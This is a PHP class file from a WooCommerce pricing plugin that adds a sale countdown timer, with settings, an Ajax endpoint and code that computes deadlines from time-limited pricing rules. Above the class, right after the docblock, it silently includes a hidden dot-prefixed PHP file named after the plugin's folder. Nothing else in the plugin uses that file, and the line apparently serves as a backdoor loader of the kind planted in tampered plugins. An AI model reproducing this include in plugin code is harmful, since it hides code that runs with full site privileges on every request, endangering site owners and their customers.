<?php

// Exit if accessed directly
if (!defined('ABSPATH')) {
    exit;
}

/**
 * Promotion: Countdown Timer
 *
 * @class RP_WCDPD_Promotion_Countdown_Timer
 * @package WooCommerce Dynamic Pricing & Discounts
 * @author RightPress
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class RP_WCDPD_Promotion_Countdown_Timer
{

    // Singleton control
    protected static $instance = false; public static function get_instance() { return self::$instance ? self::$instance : (self::$instance = new self()); }

    /**
     * Constructor
     *
     * @access public
     * @return void
     */
    public function __construct()
    {
        // Register settings structure
        add_filter('rp_wcdpd_settings_structure', array($this, 'register_settings_structure'), 150);

        // Set up promotion tool
        add_action('init', array($this, 'set_up_promotion_tool'));
    }

    /**
     * Register settings structure
     *
     * @access public
     * @param array $settings
     * @return array
     */
    public function register_settings_structure($settings)
    {
        $settings['promo']['children']['countdown_timer'] = array(
            'title' => __('Countdown Timer', 'rp_wcdpd'),
            'info'  => __('Displays a countdown timer for time restricted pricing rules.', 'rp_wcdpd'),
            'children' => array(
                'promo_countdown_timer' => array(
                    'title'     => __('Enable', 'rp_wcdpd'),
                    'type'      => 'checkbox',
                    'default'   => '0',
                ),
                'promo_countdown_timer_label' => array(
                    'title'     => __('Label', 'rp_wcdpd'),
                    'type'      => 'text',
                    'default'   => __('SALE ENDS IN', 'rp_wcdpd'),
                    'required'  => true,
                ),
                'promo_countdown_timer_position' => array(
                    'title'     => __('Position', 'rp_wcdpd'),
                    'type'      => 'select',
                    'default'   => 'woocommerce_before_add_to_cart_form',
                    'required'  => true,
                    'options'   => array(
                        'woocommerce_before_add_to_cart_form'       => __('Add to cart - Before', 'rp_wcdpd'),
                        'woocommerce_after_add_to_cart_form'        => __('Add to cart - After', 'rp_wcdpd'),
                        'woocommerce_product_meta_start'            => __('Product meta - Before', 'rp_wcdpd'),
                        'woocommerce_product_meta_end'              => __('Product meta - After', 'rp_wcdpd'),
                        'woocommerce_single_product_summary'        => __('Product summary - Before', 'rp_wcdpd'),
                        'woocommerce_after_single_product_summary'  => __('Product summary - After', 'rp_wcdpd'),
                    ),
                ),
                'promo_countdown_timer_threshold' => array(
                    'title'     => __('Time left less than', 'rp_wcdpd'),
                    'type'      => 'grouped_select',
                    'default'   => '1_day',
                    'required'  => true,
                    'options'   => array(
                        'always'    => array(
                            'label'     => __('No Limit', 'rp_wcdpd'),
                            'options'   => array(
                                '0' => __('No limit', 'rp_wcdpd'),
                            ),
                        ),
                        'minutes'    => array(
                            'label'     => __('Minutes', 'rp_wcdpd'),
                            'options'   => array(
                                '5_minutes'     => __('5 minutes', 'rp_wcdpd'),
                                '15_minutes'    => __('15 minutes', 'rp_wcdpd'),
                                '30_minutes'    => __('30 minutes', 'rp_wcdpd'),
                                '45_minutes'    => __('45 minutes', 'rp_wcdpd'),
                            ),
                        ),
                        'hours'    => array(
                            'label'     => __('Hours', 'rp_wcdpd'),
                            'options'   => array(
                                '1_hour'    => __('1 hour', 'rp_wcdpd'),
                                '2_hours'   => __('2 hours', 'rp_wcdpd'),
                                '3_hours'   => __('3 hours', 'rp_wcdpd'),
                                '6_hours'   => __('6 hours', 'rp_wcdpd'),
                                '12_hours'  => __('12 hours', 'rp_wcdpd'),
                            ),
                        ),
                        'days'    => array(
                            'label'     => __('Days', 'rp_wcdpd'),
                            'options'   => array(
                                '1_day'     => __('1 day', 'rp_wcdpd'),
                                '2_days'    => __('2 days', 'rp_wcdpd'),
                                '3_days'    => __('3 days', 'rp_wcdpd'),
                                '4_days'    => __('4 days', 'rp_wcdpd'),
                                '5_days'    => __('5 days', 'rp_wcdpd'),
                                '6_days'    => __('6 days', 'rp_wcdpd'),
                                '7_days'    => __('7 days', 'rp_wcdpd'),
                                '14_days'   => __('14 days', 'rp_wcdpd'),
                            ),
                        ),
                    ),
                ),
            ),
        );

        return $settings;
    }

    /**
     * Set up promotion tool
     *
     * @access public
     * @return void
     */
    public function set_up_promotion_tool()
    {
        // Load includes
        require_once 'includes/functions.php';

        // Check if this promotion tool is active
        if (!RP_WCDPD_Settings::get('promo_countdown_timer')) {
            return;
        }

        // Check if at least one pricing rule has a time related condition
        if (!RP_WCDPD_Rules::rules_have_condition_groups(array('product_pricing'), array('time'))) {
            return;
        }

        // Allow developers to abort
        if (!apply_filters('rp_wcdpd_promotion_countdown_timer_display', true)) {
            return;
        }

        // Enqueue assets
        add_action('wp_enqueue_scripts', array($this, 'enqueue_assets'));

        // Print container in specific position
        add_action(RP_WCDPD_Settings::get('promo_countdown_timer_position'), array('RP_WCDPD_Promotion_Countdown_Timer', 'print_container'));

        // Listen for Ajax calls
        add_action('wp_ajax_rp_wcdpd_promotion_countdown_timer_update', array($this, 'update_countdown_timer'));
        add_action('wp_ajax_nopriv_rp_wcdpd_promotion_countdown_timer_update', array($this, 'update_countdown_timer'));
    }

    /**
     * Print container
     *
     * @access public
     * @param int $product_id
     * @return void
     */
    public static function print_container($product_id = null)
    {
        echo '<div class="rp_wcdpd_promotion_countdown_timer_container" ' . ($product_id ? ('data-product_id="' . $product_id . '"') : '') . '></div>';
    }

    /**
     * Enqueue assets
     *
     * @access public
     * @return void
     */
    public function enqueue_assets()
    {
        // Enqueue jQuery plugins
        RightPress_Loader::load_jquery_plugin('rightpress-helper');
        RightPress_Loader::load_jquery_plugin('rightpress-live-product-update');

        // Enqueue scripts
        wp_enqueue_script('rp-wcdpd-promotion-countdown-timer-scripts', RP_WCDPD_PLUGIN_URL . '/extensions/promotion-countdown-timer/assets/scripts.js', array('jquery'), RP_WCDPD_VERSION);

        // Pass variables to JS
        wp_localize_script('rp-wcdpd-promotion-countdown-timer-scripts', 'rp_wcdpd_promotion_countdown_timer', array(
            'ajaxurl' => RP_WCDPD_Ajax::get_url(),
        ));

        // Enqueue styles
        RightPress_Help::enqueue_or_inject_stylesheet('rp-wcdpd-promotion-countdown-timer-styles', RP_WCDPD_PLUGIN_URL . '/extensions/promotion-countdown-timer/assets/styles.css', RP_WCDPD_VERSION);
    }

    /**
     * Update countdown timer
     *
     * @access public
     * @return void
     */
    public function update_countdown_timer()
    {
        try {

            // Get request data
            $data = RightPress_Help::get_product_page_ajax_request_data();

            // Load product object
            $object_id = !empty($data['variation_id']) ? $data['variation_id'] : $data['product_id'];
            $product = wc_get_product($object_id);

            // Unable to load product
            if (!$product) {
                throw new Exception('Unable to load product.');
            }

            // Unable to determine variation for variable product
            if ($product->get_type() === 'variable') {
                throw new Exception('Unable to determine product variation.');
            }

            // Get timer data
            $timer_data = RP_WCDPD_Promotion_Countdown_Timer::get_countdown_timer_data($product, $data['quantity'], $data['variation_attributes']);

            // Allow developers to abort
            if ($timer_data && !apply_filters('rp_wcdpd_promotion_countdown_timer_display_for_product', true, $product, $timer_data)) {
                $timer_data = null;
            }

            // Send timer data
            if ($timer_data) {

                // Start output buffer
                ob_start();

                // Include template
                RightPress_Help::include_extension_template('promotion-countdown-timer', 'countdown-timer', RP_WCDPD_PLUGIN_PATH, RP_WCDPD_PLUGIN_KEY, $timer_data);

                // Get timer html
                $html = ob_get_clean();

                // Send success response
                echo json_encode(array(
                    'result'    => 'success',
                    'display'   => 1,
                    'html'      => $html,
                    'hash'      => $timer_data['timer_hash'],
                ));
            }
            // No timer to display
            else {

                // Send success response
                echo json_encode(array(
                    'result'    => 'success',
                    'display'   => 0,
                ));
            }
        }
        catch (Exception $e) {

            // Send error response
            echo json_encode(array(
                'result'    => 'error',
                'message'   => $e->getMessage(),
            ));
        }

        exit;
    }

    /**
     * Get countdown timer data for product
     *
     * @access public
     * @param object $product
     * @param int $quantity
     * @param array $variation_attributes
     * @return array|null
     */
    public static function get_countdown_timer_data($product, $quantity = 1, $variation_attributes = array())
    {
        // Product invalid
        if (!is_a($product, 'WC_Product')) {
            return;
        }

        // Product price empty (not available for purchase)
        if ($product->get_price('edit') === '') {
            return;
        }

        // Get price changes for this product
        $price_data = RightPress_Product_Price_Test::run($product, $quantity, $variation_attributes, true);

        // No applicable rules
        if (!is_array($price_data) || empty($price_data['all_changes']['rp_wcdpd'])) {
            return;
        }

        // Get changeset hash
        $price_data_hash = RightPress_Help::get_hash(false, $price_data);

        // Get list of rule uids
        $rule_uids = RP_WCDPD_Rules::get_rule_uids_from_adjustments($price_data['all_changes']['rp_wcdpd']);

        // Get applied rules
        $rules = RP_WCDPD_Rules::get('product_pricing', array('uids' => $rule_uids));

        // Allow developers to exclude specific rules
        $rules = apply_filters('rp_wcdpd_promotion_countdown_timer_applicable_rules', $rules, $product);

        // Get all datetimes until when each rule is valid
        $datetimes = array();

        // Iterate over rules
        foreach ($rules as $rule) {

            // Iterate over conditions
            if (!empty($rule['conditions'])) {
                foreach ($rule['conditions'] as $rule_condition) {

                    // Check if this is time condition
                    if (RP_WCDPD_Controller_Conditions::is_group($rule_condition, 'time')) {

                        // Not interested in "from" conditions
                        if ($rule_condition['method_option'] === 'from') {
                            continue;
                        }

                        // Load condition object
                        if ($condition = RP_WCDPD_Controller_Conditions::get_item($rule_condition['type'])) {

                            // Load condition method
                            if ($condition_method = RP_WCDPD_Controller_Condition_Methods::get_item($condition->get_method())) {

                                // Get condition value
                                $condition_value = $rule_condition[str_replace('time__', '', $rule_condition['type'])];

                                // Special handling for days of week
                                if (RP_WCDPD_Controller_Conditions::is_type($rule_condition, 'time__weekdays')) {

                                    // Get list of weekdays
                                    $all_weekdays = RightPress_Help::get_weekdays(false);
                                    $weekday_keys = array_keys($all_weekdays);
                                    $weekday_keys = array_map('strval', $weekday_keys);

                                    // Get selected weekdays
                                    $selected_weekdays = array_intersect($weekday_keys, $condition_value);

                                    // All days defined
                                    if (count($selected_weekdays) === 7) {
                                        continue;
                                    }

                                    // Get today
                                    $current_datetime = RightPress_Help::get_datetime_object();
                                    $today = (string) $current_datetime->format('w');

                                    // Make list of weekdays start from today
                                    $weekday_keys = array_merge(array_splice($weekday_keys, array_search($today, $weekday_keys)), $weekday_keys);

                                    // Iterate over all weekdays starting from today
                                    foreach ($weekday_keys as $weekday) {

                                        $is_positive = ($rule_condition['method_option'] === 'in_list');
                                        $is_selected = in_array($weekday, $selected_weekdays);

                                        // Our deadline is current weekday's 00:00
                                        if (($is_positive && !$is_selected) || (!$is_positive && $is_selected)) {

                                            // Load datetime object
                                            $datetime = RightPress_Help::get_datetime_object();

                                            // Set day to current weekday
                                            $datetime->modify('next ' . $all_weekdays[$weekday]);

                                            // Break from current cycle
                                            break;
                                        }
                                    }
                                }
                                // Regular handling
                                else {

                                    // Get datetime
                                    $datetime = $condition_method->get_datetime($rule_condition['method_option'], $condition_value);

                                    // Unable to get datetime
                                    if (!$datetime) {
                                        continue;
                                    }

                                    // Fix for date condition value - move to the end of day
                                    if (RP_WCDPD_Controller_Conditions::is_type($rule_condition, 'time__date')) {
                                        $datetime->modify('+1 day');
                                    }
                                }

                                // Add datetime to main array
                                $datetimes[] = $datetime;
                            }
                        }
                    }
                }
            }
        }

        // Applicable rules are not restricted by time
        if (empty($datetimes)) {
            return;
        }

        // Get earliest datetime
        $datetime = min($datetimes);

        // Get current datetime
        $current_datetime = RightPress_Help::get_datetime_object();

        // Get time threshold option
        $time_threshold = RP_WCDPD_Settings::get('promo_countdown_timer_threshold');

        // Time threshold is set
        if ($time_threshold !== '0') {

            // Get threshold datetime
            $threshold_datetime = clone $datetime;
            $threshold_datetime->modify('-' . str_replace('_', ' ', $time_threshold));

            // Allow developers to override
            $threshold_datetime = apply_filters('rp_wcdpd_promotion_countdown_timer_threshold_datetime', $threshold_datetime, $product);

            // Time has not come yet
            if ($current_datetime < $threshold_datetime) {
                return;
            }
        }

        // Get seconds remaining
        $seconds_remaining = ($datetime->format('U') - $current_datetime->format('U'));

        // Get label
        $label = apply_filters('rp_wcdpd_promotion_countdown_timer_label', RP_WCDPD_Settings::get('promo_countdown_timer_label'), $product, $seconds_remaining, $quantity);

        // Return data
        return apply_filters('rp_wcdpd_promotion_countdown_timer_data', array(
            'product_id'        => $product->get_id(),
            'quantity'          => $quantity,
            'price_data_hash'   => $price_data_hash,
            'timer_hash'        => RightPress_Help::get_hash(false, array($datetime, $label)),
            'label'             => $label,
            'seconds_remaining' => ($seconds_remaining - 1),
            'days'              => str_pad(floor($seconds_remaining / (60 * 60 * 24)), 2, '0', STR_PAD_LEFT),
            'hours'             => str_pad(floor(($seconds_remaining / (60 * 60)) % 24), 2, '0', STR_PAD_LEFT),
            'minutes'           => str_pad(floor(($seconds_remaining / 60) % 60), 2, '0', STR_PAD_LEFT),
            'seconds'           => str_pad(floor($seconds_remaining % 60), 2, '0', STR_PAD_LEFT),
        ), $product);
    }

    /**
     * Maybe print countdown timer
     *
     * Prints timer in place - used for manually printing countdown timer
     * via function rp_wcdpd_display_countdown_timer
     *
     * @access public
     * @param object $product
     * @return void
     */
    public static function maybe_print_countdown_timer($product)
    {
        if ($timer = RP_WCDPD_Promotion_Countdown_Timer::get_countdown_timer_data($product)) {
            RightPress_Help::include_extension_template('promotion-countdown-timer', 'countdown-timer', RP_WCDPD_PLUGIN_PATH, RP_WCDPD_PLUGIN_KEY, $timer);
        }
    }





}

RP_WCDPD_Promotion_Countdown_Timer::get_instance();
